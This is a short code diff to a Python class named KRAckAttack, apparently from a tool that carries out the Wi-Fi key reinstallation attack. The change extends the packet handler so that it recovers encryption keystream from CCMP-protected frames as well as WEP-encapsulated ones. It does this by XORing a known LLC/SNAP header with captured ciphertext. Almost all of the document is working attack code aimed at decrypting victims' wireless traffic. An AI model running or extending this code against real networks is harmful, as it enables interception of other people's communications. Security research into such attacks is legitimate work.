@@ -319,10 +319,15 @@ class KRAckAttack():
 	def handle_from_client_pairwise(self, client, p):
 		if args.group: return
 
-		# Note that scapy incorrectly puts Extended IV into wepdata field, so skip those four bytes				
-		plaintext = "\xaa\xaa\x03\x00\x00\x00"
-		encrypted = p[Dot11WEP].wepdata[4:4+len(plaintext)]
-		keystream = xorstr(plaintext, encrypted)
+		if p.haslayer(Dot11WEP):
+			# Note that scapy incorrectly puts Extended IV into wepdata field, so skip those four bytes				
+			plaintext = "\xaa\xaa\x03\x00\x00\x00"
+			encrypted = p[Dot11WEP].wepdata[4:-4]
+			keystream = xorstr(plaintext, encrypted)
+		elif p.haslayer(Dot11CCMP):
+			plaintext = "\xaa\xaa\x03\x00\x00\x00"
+			encrypted = p[Dot11CCMP].data
+			keystream = xorstr(plaintext, encrypted)
 
 		iv = dot11_get_iv(p)
 		if iv <= 1: log(DEBUG, "Ciphertext: " + encrypted.encode("hex"), showtime=False)
